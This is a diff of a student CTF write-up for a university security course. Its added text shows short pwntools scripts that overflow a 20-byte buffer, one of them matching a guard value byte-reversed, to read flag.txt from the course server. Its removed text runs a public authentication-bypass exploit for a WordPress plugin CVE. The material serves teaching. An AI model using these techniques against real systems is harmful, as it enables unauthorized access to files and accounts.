@@ -1,33 +1,50 @@
-# Week 4: CTF - web
+# Week 5: CTF - web
 
 ## Goal
-> Get access as an administrator in a wordpress server using a known CVE exploit.
+> Gain access to a file by taking advantage of a buffer overflow.
 
 ### Challenge 1
-> First of all we explored the website to collect some information regarding the wordpress version, the used plugins and the platform users.  
+ 
+> After analyzing the source code, we realized that whatever namefile was in the meme_file variable was the file that was going to be opened, read and printed.
+> So if we could change the meme_file variable to the file "flag.txt" we would then have access to this file and its contents.
+> Since the *scanf* function reads 28 characters into the 20 character buffer then everything beyond the 20th character will be written to the meme_file variable. So we used the following python code to access the flag.txt file : 
+```
+#!/usr/bin/python3
+from pwn import *
 
-> On the [WordPress Hosting service page](http://ctf-fsi.fe.up.pt:5001/product/wordpress-hosting/), in the additional information section, it's possible to check the wordpress and the used plugins versions: 
-> * Wordpress - 5.8.1
-> * WooCommerce plugin - 5.7.1
-> * Booster for WooCommerce plugin - 5.4.3
+r = remote('ctf-fsi.fe.up.pt', 4003)
 
-> With this information we searched in a [CVE](https://cve.mitre.org/index.html) database for the correct CVE. After some tries, we tried the keywords 'wordpress' and 'Woocomerce Booster' which gave us 11 results. The [CVE-2021-34646](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34646) description matched the specifications that we were looking for.  
-> The correct flag for challenge 1 was found: *flag{CVE-2021-34646}*
+r.recvuntil(b":")
+r.sendline(b"aaaaaaaaaaaaaaaaaaaa" + b"flag.txt") # Send 20 "trash" bytes and then the value of the file we want to open
+r.interactive()
+
+```
+
+> The correct flag for challenge 1 was found: 
+```
+flag{e2b5a6b98ff37b5c85dd8a59bf222caa}
+```
 
 
 ### Challenge 2
 
-> On challenge two we started by searching in the Exploit Database platform for a exploit regarding the CVE-2021-34646.  
-> We came across an exploit called [
-WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
-](https://www.exploit-db.com/exploits/50299) that's specifically created to run against the CVE.
+> This challenge had some minor changes from the first one in order to prevent a buffer overflow . However, this mitigation did not prove to be efficient since it was easily bypassed.
 
-> First we used the URL -  http://ctf-fsi.fe.up.pt:5001/wp-json/wp/v2/users - to access the list of users and their id's.  
-> With the id of the administrator we now could download the given python file and execute it with the correct parameters:
-> * *./exploit_CVE-2021-34646.py [URL] [Admin id]*
-> * *./exploit_CVE-2021-34646.py http://ctf-fsi.fe.up.pt:5001/ 1*
+> A variable has been added between the buffer and meme_file to prevent overflow. 
+> However, if we could replicate what was written in this variable ("0xfefc2223") the program would assume that this variable had not been changed and would therefore open the file.
+> Since the variables are written in the stack bottom-up, the bytes of the val variable must be set in the reverse order. Using the following python script we can perform this attack and get the flag:
 
-> After executing the file three links were generated and one of them allowed us to access the system as the administrator.
-> Then we just followed the [link](http://ctf-fsi.fe.up.pt:5001/wp-admin/edit.php) provided in moodle, accessed a private post for the employess and found the flag!  
-> The correct flat for challenge 2 was: *flag{please don't bother me}*
+```
+from pwn import *
 
+r = remote('ctf-fsi.fe.up.pt', 4000)
+r.recvuntil(b":")
+r.sendline(b"aaaaaaaaaaaaaaaaaaaa" + b"\x23\x22\xfc\xfe" + b"flag.txt")
+r.interactive()
+
+```
+
+> The correct flag for challenge 1 was found: 
+```
+flag{0e68e08552b7bfe81eb7f7201d81d023}
+```
